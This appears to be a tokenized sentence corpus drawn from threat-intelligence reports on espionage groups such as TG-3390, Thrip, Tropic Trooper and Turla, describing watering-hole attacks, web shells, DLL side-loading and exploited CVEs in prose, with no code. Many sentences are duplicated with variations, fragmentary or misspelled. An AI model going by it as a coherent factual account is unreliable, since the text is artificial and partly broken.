defense
manufacturing
projects
,
but
also
targeting
other
industry
verticals
and
attacking
organizations
involved
in
international
relations
.
 
In
comparison
to
other
threat
groups
,
TG-3390
is
notable
for
its
tendency
to
compromise
Microsoft
Exchange
servers
using
a
custom
backdoor
and
credential
logger
.
 
CTU
researchers
have
evidence
that
the
TG-3390
compromised
U.S.
and
UK
organizations
in
the
following
verticals
:
manufacturing
(
specifically
aerospace
(
including
defense
contractors
)
,
automotive
,
technology
,
energy
,
and
pharmaceuticals
)
,
education
,
and
legal
,
as
well
as
organizations
focused
on
international
relations
.
 
Based
on
analysis
of
the
group
's
SWCs
,
TG-3390
operations
likely
affect
organizations
in
other
countries
and
verticals
.
 
TG-3390
operates
a
broad
and
long-running
campaign
of
SWCs
and
has
compromised
approximately
100
websites
as
of
this
publication
.
 
CTU
researchers
have
evidence
that
the
threat
group
compromised
U.S.
and
UK
organizations
in
the
following
verticals
:
manufacturing
(
specifically
aerospace
(
including
defense
contractors
)
,
automotive
,
technology
,
energy
,
and
pharmaceuticals
)
,
education
,
and
legal
,
as
well
as
organizations
focused
on
international
relations
.
 
Like
many
threat
groups
,
TG-3390
conducts
strategic
web
compromises
(
SWCs
)
,
also
known
as
watering
hole
attacks
,
on
websites
associated
with
the
target
organization
's
vertical
or
demographic
to
increase
the
likelihood
of
finding
victims
with
relevant
information
.
 
Through
an
IP
address
whitelisting
process
,
the
threat
group
selectively
targets
visitors
to
these
websites
.
 
After
the
initial
compromise
,
TG-3390
delivers
the
HTTPBrowser
backdoor
to
its
victims
.
 
CTU
researchers
assess
with
high
confidence
that
TG-3390
uses
information
gathered
from
prior
reconnaissance
activities
to
selectively
compromise
users
who
visit
websites
under
its
control
.
 
TG-3390
uses
the
PlugX
remote
access
tool
.
 
The
SWC
of
a
Uyghur
cultural
website
suggests
intent
to
target
the
Uyghur
ethnic
group
,
a
Muslim
minority
group
primarily
found
in
the
Xinjiang
region
of
China
.
 
The
threat
actors
have
used
the
Baidu
search
engine
,
which
is
only
available
in
Chinese
,
to
conduct
reconnaissance
activities
.
 
Recently
,
CTU
researchers
responded
to
an
intrusion
perpetrated
by
Threat
Group-1314
,
one
of
numerous
threat
groups
that
employ
the
"
living
off
the
land
"
technique
to
conduct
their
intrusions
.
 
CTU
researchers
have
observed
the
Threat
Group-3390
obtaining
information
about
specific
U.S.
defense
projects
that
would
be
desirable
to
those
operating
within
a
country
with
a
manufacturing
base
,
an
interest
in
U.S.
military
capability
,
or
both
.
 
CTU
researchers
have
observed
the
threat
group
obtaining
information
about
specific
U.S.
defense
projects
that
would
be
desirable
to
those
operating
within
a
country
with
a
manufacturing
base
,
an
interest
in
U.S.
military
capability
,
or
both
.
 
TG-3390
can
quickly
leverage
compromised
network
infrastructure
during
an
operation
and
can
conduct
simultaneous
intrusions
into
multiple
environments
.
 
Malware
used
by
the
threat
group
can
be
configured
to
bypass
network-based
detection
;
however
,
the
threat
actors
rarely
modify
host-based
configuration
settings
when
deploying
payloads
.
 
TG-3390
uses
older
exploits
to
compromise
targets
,
and
CTU
researchers
have
not
observed
the
threat
actors
using
zero-day
exploits
as
of
this
publication
.
 
In
addition
to
using
SWCs
to
target
specific
types
of
organizations
,
TG-3390
uses
spearphishing
emails
to
target
specific
victims
.
 
After
gaining
access
to
a
target
network
in
one
intrusion
analyzed
by
CTU
researchers
,
TG-3390
actors
identified
and
exfiltrated
data
for
specific
projects
run
by
the
target
organization
,
indicating
that
they
successfully
obtained
the
information
they
sought
.
 
Based
on
this
information
,
CTU
researchers
assess
that
TG-3390
aims
to
collect
defense
technology
and
capability
intelligence
,
other
industrial
intelligence
,
and
political
intelligence
from
governments
and
NGOs
.
 
Incident
response
engagements
have
given
CTU
researchers
insight
into
the
tactics
TG-3390
employs
during
intrusions
.
 
CTU
researchers
have
not
observed
TG-3390
actors
performing
reconnaissance
prior
to
compromising
organizations
.
 
CTU
researchers
have
observed
the
threat
actors
installing
a
credential
logger
and
backdoor
on
Microsoft
Exchange
servers
,
which
requires
a
technical
grasp
of
Internet
Information
Services
(
IIS
)
.
 
TG-3390
is
capable
of
using
a
C2
infrastructure
that
spans
multiple
networks
and
registrars
.
 
TG-3390
SWCs
may
be
largely
geographically
independent
,
but
the
group
's
most
frequently
used
C2
registrars
and
IP
net
blocks
are
located
in
the
U.S
.
 
Using
a
U.S.
based
C2
infrastructure
to
compromise
targets
in
the
U.S.
helps
TG-3390
actors
avoid
geo-blocking
and
geo-flagging
measures
used
in
network
defense
.
 
The
threat
actors
create
PlugX
DLL
stub
loaders
that
will
run
only
after
a
specific
date
.
 
The
compile
dates
of
the
samples
analyzed
by
CTU
researchers
are
all
later
than
the
hard-coded
August
8
,
2013
date
,
indicating
that
the
code
might
be
reused
from
previous
tools
.
 
One
archive
sample
analyzed
by
CTU
researchers
contained
a
legitimate
PDF
file
,
a
benign
image
of
interest
to
targets
(
see
Figure
8
)
,
and
an
HTTPBrowser
installer
disguised
as
an
image
file
.
 
CTU
researchers
have
observed
TG-3390
activity
between
04:00
and
09:00
UTC
,
which
is
12:00
to
17:00
local
time
in
China
(
UTC
+8
)
.
 
TG-3390
sends
spearphishing
emails
with
ZIP
archive
attachments
.
 
CTU
researchers
have
observed
TG-3390
compromising
a
target
organization
's
externally
and
internally
accessible
assets
,
such
as
an
OWA
server
,
and
adding
redirect
code
to
point
internal
users
to
an
external
website
that
hosts
an
exploit
and
delivers
malware
.
 
TG-3390
actors
have
used
Java
exploits
in
their
SWCs
.
 
In
particular
,
TG-3390
has
exploited
CVE-2011-3544
,
a
vulnerability
in
the
Java
Runtime
Environment
,
to
deliver
the
HTTPBrowser
backdoor
;
and
CVE-2010-0738
,
a
vulnerability
in
JBoss
,
to
compromise
internally
and
externally
accessible
assets
used
to
redirect
users'
web
browsers
to
exploit
code
.
 
In
activity
analyzed
by
CTU
researchers
,
TG-3390
executed
the
Hunter
web
application
scanning
tool
against
a
target
server
running
IIS
.
 
In
particular
,
the
threat
actors
have
exploited
CVE-2011-3544
,
a
vulnerability
in
the
Java
Runtime
Environment
,
to
deliver
the
HTTPBrowser
backdoor
;
and
CVE-2010-0738
,
a
vulnerability
in
JBoss
,
to
compromise
internally
and
externally
accessible
assets
used
to
redirect
users'
web
browsers
to
exploit
code
.
 
TG-3390
uses
DLL
side
loading
,
a
technique
that
involves
running
a
legitimate
,
typically
digitally
signed
,
program
that
loads
a
malicious
DLL
.
 
CTU
researchers
have
observed
the
Threat
Group-3390
employing
legitimate
Kaspersky
antivirus
variants
in
analyzed
samples
.
 
The
adversaries
have
used
this
technique
to
allow
PlugX
and
HTTPBrowser
to
persist
on
a
system
.
 
CTU
researchers
have
observed
the
TG-3390
employing
legitimate
Kaspersky
antivirus
variants
in
analyzed
samples
.
 
TG-3390
actors
have
deployed
the
OwaAuth
web
shell
to
Exchange
servers
,
disguising
it
as
an
ISAPI
filter
.
 
In
other
cases
,
threat
actors
placed
web
shells
on
externally
accessible
servers
,
sometimes
behind
a
reverse
proxy
,
to
execute
commands
on
the
compromised
system
.
 
CTU
researchers
have
discovered
numerous
details
about
TG-3390
operations
,
including
how
the
adversaries
explore
a
network
,
move
laterally
,
and
exfiltrate
data
.
 
When
the
adversaries'
operations
are
live
,
they
modify
the
record
again
to
point
the
C2
domain
to
an
IP
address
they
can
access
.
 
They
then
identify
the
Exchange
server
and
attempt
to
install
the
OwaAuth
web
shell
.
 
If
the
OwaAuth
web
shell
is
ineffective
because
the
victim
uses
two-factor
authentication
for
webmail
,
TG-3390
identify
other
externally
accessible
servers
and
deploy
ChinaChopper
web
shells
.
 
After
compromising
an
initial
victim
's
system
(
patient
0
)
,
the
threat
actors
use
the
Baidu
search
engine
to
search
for
the
victim
's
organization
name
.
 
CTU
researchers
discovered
the
threat
actors
searching
for
"
[company]
login
"
,
which
directed
them
to
the
landing
page
for
remote
access
.
 
TG-3390
actors
keep
track
of
and
leverage
existing
ASPXTool
web
shells
in
their
operations
,
preferring
to
issue
commands
via
an
internally
accessible
Web
shell
rather
than
HTTPBrowser
or
PlugX
.
 
Within
six
hours
of
entering
the
environment
,
the
threat
actors
compromised
multiple
systems
and
stole
credentials
for
the
entire
domain
.
 
Despite
multiple
public
disclosures
of
their
activities
,
BRONZE
UNION
remains
an
active
and
formidable
threat
as
of
this
publication
.
 
In
2015
,
the
SecureWorks
Counter
Threat
Unit
(
CTU
)
research
team
documented
the
BRONZE
UNION
threat
group
(
formerly
labeled
TG-3390
)
,
which
CTU
analysis
suggests
is
based
in
the
People's
Republic
of
China
(
PRC
)
.
 
After
reestablishing
access
,
the
adversaries
download
tools
such
as
gsecudmp
and
WCE
that
are
staged
temporarily
on
websites
that
TG-3390
previously
compromised
but
never
used
.
 
In
2015
,
the
SecureWorks
documented
the
BRONZE
UNION
threat
group
(
formerly
labeled
TG-3390
)
,
which
CTU
analysis
suggests
is
based
in
the
People's
Republic
of
China
(
PRC
)
.
 
BRONZE
UNION
threat
campaigns
that
illustrate
the
evolution
of
the
group
's
methods
and
espionage
objectives
.
 
Based
on
BRONZE
UNION
's
targeting
activity
,
CTU
researchers
assess
it
is
highly
likely
that
the
group
focuses
on
political
and
defense
organization
networks
.
 
this
SWC
was
used
to
specifically
target
Turkish
.
 
In
2016
,
the
threat
actors
conducted
a
strategic
web
compromise
(
SWC
)
on
the
website
of
an
international
industry
organization
that
affected
aerospace
,
academic
,
media
,
technology
,
government
,
and
utilities
organizations
around
the
world
.
 
In
addition
,
BRONZE
UNION
activity
on
multiple
U.S.-based
defense
manufacturer
networks
included
the
threat
actors
seeking
information
associated
with
aerospace
technologies
,
combat
processes
,
and
naval
defense
systems
.
 
this
SWC
was
used
to
specifically
target
Turkish
goverment
.
 
Since
that
analysis
,
CTU
researchers
have
observed
multiple
BRONZE
UNION
threat
campaigns
that
illustrate
the
evolution
of
the
group
's
methods
and
espionage
objectives
.
 
this
SWC
was
used
to
specifically
target
Turkish
banking
.
 
this
SWC
was
used
to
specifically
target
Turkish
academic
networks
.
 
BRONZE
UNION
has
consistently
demonstrated
the
capability
to
conduct
successful
large-scale
intrusions
against
high-profile
networks
and
systems
.
 
The
threat
actors
appear
to
be
able
to
create
and
leverage
multiple
SWCs
in
parallel
.
 
In
a
separate
incident
,
CTU
researchers
identified
a
file
named
s.txt
,
which
is
consistent
with
the
output
of
the
Netview
host-enumeration
tool
.
 
BRONZE
UNION
actors
leveraged
initial
web
shell
access
on
Internet-facing
systems
to
conduct
internal
reconnaissance
.
 
BRONZE
UNION
appears
to
use
a
combination
of
self-registered
IP
addresses
and
commercial
VPN
services
in
its
command
and
control
(
C2
)
and
operational
infrastructure
.
 
This
script
relays
commands
and
output
between
the
controller
and
the
system
.
 
The
threat
actors
used
the
appcmd
command-line
tool
to
unlock
and
disable
the
default
logging
component
on
the
server
(
systsm.webServer/httplogging
)
and
then
delete
existing
logs
from
the
system
(
see
Figure
4
)
.
 
In
2016
,
CTU
researchers
observed
the
group
using
native
system
.
 
In
March
2018
we
detected
an
ongoing
campaign
.
 
TG-3390
's
activities
indicate
a
preference
for
leveraging
SWCs
and
scan-and-exploit
techniques
to
compromise
target
systems
.
 
As
of
this
publication
,
BRONZE
UNION
remains
a
formidable
threat
group
that
targets
intellectual
property
and
executes
its
operations
at
a
swift
pace
.
 
we
detected
an
ongoing
campaign
targeting
a
national
data
center
.
 
The
operators
used
the
HyperBro
Trojan
as
their
last-stage
in-memory
remote
administration
tool
(
RAT
)
.
 
we
detected
an
ongoing
campaign
targeting
a
national
data
center
in
the
Centeral
Asia
.
 
The
tools
found
in
this
campaign
,
such
as
the
HyperBro
Trojan
,
are
regularly
used
by
a
variety
of
Chinese-speaking
actors
.
 
Due
to
tools
and
tactics
in
use
we
attribute
the
campaign
to
LuckyMouse
Chinese-speaking
actor
(
also
known
as
EmissaryPanda
and
APT27
)
.
 
It's
possible
TG-3390
used
a
waterhole
to
infect
data
center
employees
.
 
Even
when
we
observed
LuckyMouse
using
weaponized
documents
with
CVE-2017-11882
(
Microsoft
Office
Equation
Editor
,
widely
used
by
Chinese-speaking
actors
since
December
2017
)
,
we
cant
prove
they
were
related
to
this
particular
attack
.
 
We
suspect
this
router
was
hacked
as
part
of
the
campaign
in
order
to
process
the
malware
's
HTTP
requests
.
 
In
March
2017
,
Wikileaks
published
details
about
an
exploit
affecting
Mikrotik
called
ChimayRed
.
 
There
were
traces
of
HyperBro
in
the
infected
data
center
from
mid-November
2017
.
 
In
March
2017
,
Wikileaks
published
details
about
an
exploit
affecting
Mikrotik
called
ChimayRed
.
 
This
is
a
hacking
group
with
Chinese
origins
which
targets
selected
organisations
related
with
education
,
energy
and
technology
.
 
Usually
,
the
delivered
payload
is
either
the
well-known
'
PlugX
'
or
'
HTTPBrowser
'
RAT
,
a
tool
which
is
believed
to
have
Chinese
origins
and
to
be
used
only
by
certain
Chinese
hacking
groups
.
 
Emissary
Panda
has
used
many
ACTs
with
the
most
notable
being
the
exploits
from
the
Hacking
Team
leak
.
 
Emissary
Panda
is
still
active
and
continues
to
target
selected
organisations
.
 
Cybersecurity
researchers
have
uncovered
an
espionage
campaign
that
has
targeted
a
national
data
center
of
an
unnamed
central
Asian
country
in
order
to
conduct
watering
hole
attacks
.
 
The
campaign
is
believed
to
be
active
covertly
since
fall
2017
.
 
LuckyMouse
,
also
known
as
Iron
Tiger
,
EmissaryPanda
,
APT
27
and
Threat
Group-3390
,
is
the
same
group
of
Chinese
hackers
who
was
found
targeting
Asian
countries
with
Bitcoin
mining
malware
early
this
year
.
 
March
by
security
researchers
from
Kaspersky
Labs
.
 
For
example
,
at
the
end
of
2016
CTU
researchers
observed
the
threat
actors
using
native
system
functionality
to
disable
logging
processes
and
delete
logs
within
a
network
.
 
The
group
has
been
active
since
at
least
2010
and
was
behind
many
previous
attack
campaigns
resulting
in
the
theft
of
massive
amounts
of
data
from
the
directors
and
managers
of
US-based
defense
contractors
.
 
attacks
to
a
Chinese-speaking
threat
actor
group
called
LuckyMouse
.
 
LuckyMouse
has
been
spotted
using
a
widely
used
Microsoft
Office
vulnerability
(
CVE-2017-11882
)
.
 
This
time
the
group
chose
a
national
data
center
as
its
target
from
an
unnamed
country
in
Central
Asia
in
an
attempt
to
gain
"
access
to
a
wide
range
of
government
resources
at
one
fell
swoop
"
.
 
The
initial
attack
vector
used
in
the
attack
against
the
data
center
is
unclear
,
but
researchers
believe
LuckyMouse
possibly
had
conducted
watering
hole
or
phishing
attacks
to
compromise
accounts
belonging
to
employees
at
the
national
data
center
.
 
According
to
the
researchers
,
the
group
injected
malicious
JavaScript
code
into
the
official
government
websites
associated
with
the
data
center
in
order
to
conduct
watering
hole
attacks
.
 
the
targeted
system
with
a
piece
of
malware
called
HyperBro
,
a
Remote
Access
Trojan
(
RAT
)
.
 
The
main
command
and
control
(
C&C
)
server
used
in
this
attack
is
hosted
on
an
IP
address
which
belongs
to
a
Ukrainian
ISP
,
specifically
to
a
MikroTik
router
running
a
firmware
version
released
in
March
2016
.
 
the
targets
of
the
hacking
group
were
in
the
automotive
.
 
Dell
SecureWorks
researchers
unveiled
a
report
on
Threat
Group-3390
that
has
targeted
companies
around
the
world
while
stealing
massive
amounts
of
industrial
data
.
 
The
group
,
believed
to
be
based
in
China
,
has
also
targeted
defense
contractors
,
colleges
and
universities
,
law
firms
,
and
political
organizations
including
organizations
related
to
Chinese
minority
ethnic
groups
.
 
LAS
VEGASToday
at
the
Black
Hat
information
security
conference
,
Dell
SecureWorks
researchers
unveiled
a
report
on
a
newly
detected
hacking
group
that
has
targeted
companies
around
the
world
while
stealing
massive
amounts
of
industrial
data
.
 
Designated
as
Threat
Group
3390
and
nicknamed
"
Emissary
Panda
"
by
researchers
,
the
hacking
group
has
compromised
victims'
networks
largely
through
"
watering
hole
"
attacks
launched
from
over
100
compromised
legitimate
websites
,
sites
picked
because
they
were
known
to
be
frequented
by
those
targeted
in
the
attack
.
 
the
United
Kingdom
had
data
stolen
by
members
of
Emissary
Panda
.
 
the
US
had
data
stolen
by
members
of
Emissary
Panda
.
 
No
zero-day
vulnerabilities
were
used
to
breach
targeted
networks
,
instead
"
TG-3390
relied
on
old
vulnerabilities
such
as
CVE-2011-3544
"
a
near-year-old
Java
security
hole
"
and
CVE-2010-0738
to
compromise
their
targets
"
,
Dell
SecureWorks'
researchers
reported
.
 
The
group
used
a
number
of
tools
common
to
other
Chinese
hacking
groups
,
but
they
had
a
few
unique
tools
of
their
own
with
interfaces
developed
for
Standard
(
Simplified
)
Chinese
.
 
If
the
address
falls
within
ranges
that
the
attackers
are
interested
in
,
the
malicious
site
waits
for
their
next
page
view
to
drop
an
exploit
on
the
desirable
target
's
PC
.
 
Visitors
to
sites
exploited
by
Emissary
Panda
are
directed
by
code
embedded
in
the
sites
to
a
malicious
webpage
,
which
screens
their
IP
address
.
 
There
has
also
been
at
least
one
victim
targeted
by
a
spear-phishing
attack
.
 
A
variety
of
malware
,
including
the
PlugX
tool
,
was
shared
with
other
known
Chinese
threat
groups
.
 
Once
inside
networks
,
the
group
generally
targeted
Windows
network
domain
controllers
and
Exchange
e-mail
servers
,
targeting
user
credentials
to
allow
them
to
move
to
other
systems
throughout
the
targeted
network
.
 
They
used
an
exploit
of
Internet
Information
Server
to
inject
keylogger
and
backdoor
malware
onto
the
Exchange
server
.
 
But
two
tools
used
were
unique
to
the
group
:
ASPXTool
,
an
Internet
Information
Services
(
IIS
)
specific
"
Web
shell
"
used
to
gain
access
to
servers
inside
a
target
's
network
;
and
the
OwaAuth
credential
stealing
tool
and
Web
shell
,
used
to
attack
Microsoft
Exchange
servers
running
the
Web
Outlook
interface
.
 
By
using
such
features
and
tools
,
attackers
are
hoping
to
blend
in
on
the
victim
's
network
and
hide
their
activity
in
a
sea
of
legitimate
processes
.
 
TAA
leverages
advanced
artificial
intelligence
and
machine
learning
that
combs
through
Symantec
's
data
lake
of
telemetry
in
order
to
spot
patterns
associated
with
targeted
attacks
.
 
January
2018
,
TAA
triggered
an
alert
at
a
large
telecoms
operator
in
Southeast
Asia
.
 
Thrip
was
using
PsExec
to
move
laterally
between
computers
on
the
company
's
network
.
 
TAA
triggered
an
alert
at
a
large
telecoms
operator
in
Southeast
Asia
.
 
AA
triggered
an
alert
at
a
large
telecoms
operator
in
Southeast
Asia
.
 
PsExec
is
a
Microsoft
Sysinternals
tool
for
executing
processes
on
other
systems
and
is
one
of
the
most
frequently
seen
legitimate
pieces
of
software
used
by
attackers
attempting
to
live
off
the
land
.
 
TAA
not
only
flagged
this
malicious
use
of
PsExec
,
it
also
told
us
what
the
attackers
were
using
it
for
.
 
Thrip
was
attempting
to
remotely
install
a
previously
unknown
piece
of
malware
(
Infostealer.Catchamas
)
on
computers
within
the
victim
's
network
.
 
three
computers
in
China
being
used
to
launch
the
Thrip
attacks
.
 
Perhaps
the
most
worrying
discovery
we
made
was
that
Thrip
had
targeted
a
satellite
communications
operator
.
 
Thrip
seemed
to
be
mainly
interested
in
the
operational
side
of
the
company
.
 
This
suggests
to
us
that
Thrip
's
motives
go
beyond
spying
and
may
also
include
disruption
.
 
Armed
with
this
information
about
the
malware
and
living
off
the
land
tactics
being
used
by
this
group
of
attackers
whom
we
named
Thrip
,
we
broadened
our
search
to
see
if
we
could
find
similar
patterns
that
indicated
Thrip
had
been
targeting
other
organizations
.
 
The
group
had
also
targeted
three
different
telecoms
operators
,
all
based
in
Southeast
Asia
.
 
In
all
cases
,
based
on
the
nature
of
the
computers
infected
by
Thrip
,
it
appeared
that
the
telecoms
companies
themselves
and
not
their
customers
were
the
targets
of
these
attacks
.
 
Catchamas
is
a
custom
Trojan
designed
to
steal
information
from
an
infected
computer
and
contains
additional
features
designed
to
avoid
detection
.
 
Many
of
the
tools
they
use
now
feature
new
behaviors
,
including
a
change
in
the
ACT
they
maintain
a
foothold
in
the
targeted
network
.
 
Execute
a
command
through
exploits
for
CVE-2017-11882
.
 
Execute
a
command
through
exploits
for
CVE-2018-0802
.
 
The
backdoor
will
load
the
encrypted
configuration
file
and
decrypt
it
,
then
use
Secure
Sockets
Layer
(
SSL
)
protocol
to
connect
to
command-and-control
(
C&C
)
servers
.
 
TClient
is
actually
one
of
Tropic
Trooper
's
other
backdoors
.
 
The
malicious
loader
will
use
dynamic-link
library
(
DLL
)
hijacking
injecting
malicious
code
into
a
process
of
a
file/application
on
sidebar.exe
and
launch
dllhost.exe
(
a
normal
file
)
.
 
TClient
,
for
instance
,
uses
DLL
hijacking
and
injection
that
may
not
be
as
noticeable
to
others
.
 
The
backdoor
noted
by
other
security
researchers
was
encoded
with
different
algorithms
and
configured
with
different
parameter
names
in
2016
,
for
instance
.
 
Taiwan
has
been
a
regular
target
of
Cyber
Espionage
threat
actors
for
a
number
of
years
.
 
In
early
August
,
Unit
42
identified
two
attacks
using
similar
techniques
.
 
which
has
been
active
since
at
least
2011
.
 
One
of
the
attacks
used
Tropic
Trooper
's
known
Yahoyah
malware
,
but
the
other
attack
deployed
the
widely
available
Poison
Ivy
RAT
.
 
This
confirms
the
actors
are
using
Poison
Ivy
as
part
of
their
toolkit
,
something
speculated
in
the
original
Trend
Micro
report
but
not
confirmed
by
them
.
 
The
document
attached
to
this
e-mail
exploits
CVE-2012-0158
.
 
As
we
have
noted
in
many
earlier
reports
,
attackers
commonly
use
decoy
files
to
trick
victims
into
thinking
a
malicious
document
is
actually
legitimate
.
 
Further
analysis
uncovered
a
handful
of
ties
indicating
the
actors
may
also
be
using
the
PCShare
malware
family
,
which
has
not
been
previously
tied
to
the
group
.
 
This
matches
with
known
Tactics
,
Techniques
,
and
Procedures
(
TTPs
)
for
Tropic
Trooper
,
targeting
both
government
institutions
and
also
the
energy
industry
in
Taiwan
.
 
Tropic
Trooper
is
also
still
exploiting
CVE-2012-0158
,
as
are
many
threat
actors
.
 
The
Tropic
Trooper
threat
actor
group
has
been
known
to
target
governments
and
organizations
in
the
Asia
Pacific
region
for
at
least
six
years
.
 
Turla
is
a
notorious
group
that
has
been
targeting
governments
.
 
Turla
is
known
to
run
watering
hole
and
spearphishing
campaigns
to
better
pinpoint
their
targets
.
 
Turla
is
a
notorious
group
that
has
been
targeting
government
officials
.
 
The
documents
attached
to
spear-phishing
e-mails
used
in
both
attacks
contain
code
that
exploits
CVE-2012-0158
,
which
despite
its
age
remains
one
of
the
most
common
Microsoft
Word
vulnerabilities
being
exploited
by
multiple
threat
actors
.
 
Turla
is
a
notorious
group
that
has
been
targeting
diplomats
.
 
The
codename
for
Turla
APT
group
in
this
presentation
is
MAKERSMARK
.
 
The
Intercept
reported
that
there
exists
a
2011
presentation
by
Canada
's
Communication
Security
Establishment
(
CSE
)
outlining
the
errors
made
by
the
Turla
operators
during
their
operations
even
though
the
tools
they
use
are
quite
advanced
.
 
The
witnessed
techniques
,
tactics
and
procedures
(
TTPs
)
are
in-line
with
what
we
usuallysee
in
Turla
's
operation
:
a
first
stage
backdoor
,
such
as
Skipper
,
likely
delivered
through
spearphishing
followed
by
the
appearance
on
the
compromised
system
of
a
second
stage
backdoor
,
Gazerin
this
case
.
 
Southeastern
Europe
as
well
as
countries
in
the
former
Soviet
Union
Republichas
recently
been
the
main
target
.
 
Finally
,
there
are
many
similarities
between
Gazer
and
other
second
stage
backdoors
used
by
the
Turla
group
such
as
Carbon
and
Kazuar
.
 
Skipper
,
which
has
been
linked
to
Turla
in
the
past
,
was
found
alongside
Gazer
in
most
cases
we
investigated
.
 
Turla
APT
group
makes
an
extra
effort
to
avoid
detection
by
wiping
files
securely
,
changing
the
strings
and
randomizing
what
could
be
simple
markers
through
the
different
backdoor
versions
.
 
The
attackers
behind
Epic
Turla
have
infected
several
hundred
computers
in
more
than
45
countries
,
including
government
institutions
.
 
Turla
all
uses
an
encrypted
container
to
store
the
malware
's
components
and
configuration
and
they
also
log
their
actions
in
a
file
.
 
Over
the
last
10
months
,
Kaspersky
Lab
researchers
have
analyzed
a
massive
cyber-espionage
operation
which
we
call
"
Epic
Turla
"
.
 
We
also
observed
exploits
against
older
(
patched
)
vulnerabilities
,
social
engineering
techniques
and
watering
hole
strategies
in
these
attacks
.
 
The
attackers
behind
Epic
Turla
have
infected
several
hundred
computers
in
more
than
45
countries
,
including
embassies
.
 
The
attackers
behind
Epic
Turla
have
infected
several
hundred
computers
in
more
than
45
countries
,
including
military
.
 
The
attackers
behind
Epic
Turla
have
infected
several
hundred
computers
in
more
than
45
countries
,
including
education
.
 
When
G-Data
published
on
Turla/Uroburos
back
in
February
,
several
questions
remained
unanswered
.
 
The
attackers
behind
Epic
Turla
have
infected
several
hundred
computers
in
more
than
45
countries
,
including
research
and
pharmaceutical
companies
.
 
The
primary
backdoor
used
in
the
Epic
attacks
is
also
known
as
"
WorldCupSec
"
,
"
TadjMakhal
"
,
"
Wipbot
"
or
"
Tavdig
"
.
 
Thrip
's
motive
is
likely
espionage
and
its
targets
include
those
in
the
communications
,
geospatial
imaging
,
and
defense
sectors
,
both
in
the
United
States
and
Southeast
Asia
.
 
One
big
unknown
was
the
infection
vector
for
Turla
(
aka
Snake
or
Uroburos
)
.
 
The
mothership
server
is
generally
a
VPS
,
which
runs
the
Control
panel
software
used
to
interact
with
the
victims
.
 
the
backdoor
is
packaged
together
with
the
CVE-2013-5065
EoP
exploit
and
heavily
obfuscated
.
 
Once
a
victim
is
confirmed
as
"
interesting
"
,
the
attackers
upload
another
Epic
backdoor
which
has
a
unique
ID
used
to
control
this
specific
victim
.
 
Our
analysis
indicates
this
is
a
sophisticated
multi-stage
infection
;
which
begins
with
Epic
Turla
.
 
this
attack
against
a
Kaspersky
Lab
user
on
August
5
,
2014
.
 
VENOMOUS
BEAR
is
an
advanced
,
Russia-based
adversary
that's
been
active
since
at
least
2004
.
 
Venomous
Bear
has
deployed
malware
to
targets
using
several
novel
methods
.
 
For
years
,
Turla
has
relied
,
among
other
impersonations
,
on
fake
Flash
installers
to
compromise
victims
.
 
Turla
merely
uses
the
Adobe
brand
to
trick
users
into
downloading
the
malware
.
 
By
looking
at
our
telemetry
,
we
found
evidence
that
Turla
installers
were
exfiltrating
information
to
get.adobe.com
URLs
since
at
least
July
2016
.
 
Thus
,
it
is
clear
they
are
trying
to
be
as
stealthy
as
possible
by
hiding
in
the
network
traffic
of
the
targeted
organizations
.
 
Finally
,
some
of
the
victims
are
also
infected
with
other
Turla-related
malware
such
as
ComRAT
or
Gazer
.
 
Kaspersky
Lab
documented
this
behavior
in
2014
.
 
It
is
not
a
new
tactic
for
Turla
to
rely
on
fake
Flash
installers
to
try
to
trick
the
user
to
install
one
of
their
backdoors
.
 
Turla
operators
could
use
an
already-compromised
machine
in
the
network
of
the
victim
's
organization
to
perform
a
local
MitM
attack
.
 
Our
January
2018
white
paper
was
the
first
public
analysis
of
a
Turla
campaign
called
Mosquito
.
 
It
is
not
the
first
time
Turla
has
used
generic
tools
.
 
In
the
past
,
we
have
seen
the
group
using
open-source
password
dumpers
such
as
Mimikatz
.
 
Starting
in
March
2018
,
we
observed
a
significant
change
in
the
campaign
:
it
now
leverages
the
open
source
exploitation
framework
Metasploit
before
dropping
the
custom
Mosquito
backdoor
.
 
Even
an
experienced
user
can
be
fooled
by
downloading
a
malicious
file
that
is
apparently
from
adobe.com
,
since
the
URL
and
the
IP
address
correspond
to
Adobe
's
legitimate
infrastructure
.
 
However
,
to
our
knowledge
,
this
is
the
first
time
Turla
has
used
Metasploit
as
a
first
stage
backdoor
,
instead
of
relying
on
one
of
its
own
tools
such
as
Skipper
.
 
Traffic
was
intercepted
on
a
node
between
the
end
machine
and
the
Adobe
servers
,
allowing
Turla
's
operators
to
replace
the
legitimate
Flash
executable
with
a
trojanized
version
.
 
At
the
beginning
of
March
2018
,
as
part
of
our
regular
tracking
of
Turla
's
activities
,
we
observed
some
changes
in
the
Mosquito
campaign
.
 
In
this
post
,
we
have
presented
the
evolutions
of
the
Turla
Mosquito
campaign
over
the
last
few
months
.
 
Primary
targets
for
this
adversary
are
in
the
government
,
aerospace
,
NGO
,
defense
,
cryptology
and
education
sectors
.
 
Turla
's
campaign
still
relies
on
a
fake
Flash
installer
but
,
instead
of
directly
dropping
the
two
malicious
DLLs
,
it
executes
a
Metasploit
shellcode
and
drops
,
or
downloads
from
Google
Drive
,
a
legitimate
Flash
installer
.
 
The
Turla
espionage
group
has
been
targeting
various
institutions
for
many
years
.
 
Recently
,
we
found
several
new
versions
of
Carbon
,
a
second
stage
backdoor
in
the
Turla
group
arsenal
.
 
The
Turla
group
is
known
to
be
painstaking
and
work
in
stages
,
first
doing
reconnaissance
on
their
victims'
systems
before
deploying
their
most
sophisticated
tools
such
as
Carbon
.
 
Kaspersky
APT
Intelligence
Reporting
subscription
,
customers
received
an
update
in
mid-February
2017
.
 
Like
previous
Turla
activity
,
WhiteBear
leverages
compromised
websites
and
hijacked
satellite
connections
for
command
and
control
(
C2
)
infrastructure
.
 
WhiteBear
is
a
parallel
project
or
second
stage
of
the
Skipper
Turla
cluster
of
activity
documented
in
another
private
intelligence
report
"
Skipper
Turla
the
White
Atlas
framework
"
from
mid-2016
.
 
However
,
despite
the
similarities
to
previous
Turla
campaigns
,
we
believe
that
WhiteBear
is
a
distinct
project
with
a
separate
focus
.
 
From
February
to
September
2016
,
WhiteBear
activity
was
narrowly
focused
on
embassies
and
consular
operations
around
the
world
.
 
Continued
WhiteBear
activity
later
shifted
to
include
defense-related
organizations
into
June
2017
.
 
All
of
these
early
WhiteBear
targets
were
related
to
embassies
and
diplomatic/foreign
affair
organizations
.
 
Thus
,
Turla
operators
had
access
to
some
highly
sensitive
information
(
such
as
emails
sent
by
the
German
Foreign
Office
staff
)
for
almost
a
year
.
 
Our
investigation
also
led
to
the
discovery
of
dozens
of
email
addresses
registered
by
Turla
operators
for
this
campaign
and
used
to
receive
